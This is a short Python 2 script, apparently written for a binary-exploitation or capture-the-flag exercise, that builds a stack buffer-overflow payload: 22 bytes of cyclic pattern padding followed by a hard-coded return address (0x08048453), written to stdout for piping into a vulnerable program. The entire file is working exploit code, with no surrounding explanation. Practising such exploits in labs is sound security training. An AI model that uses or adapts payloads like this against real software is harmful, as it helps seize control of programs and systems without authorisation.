#!/bin/env python2
import sys

patt = 'a0A0a0A1a0A2a0A3a0A4a0A5a0A6a0A7a0A8a0A9'
rop_address = '\x53\x84\x04\x08' ## 8048453
index = 22

payload = "".join([patt[:22], rop_address])

sys.stdout.write(payload)

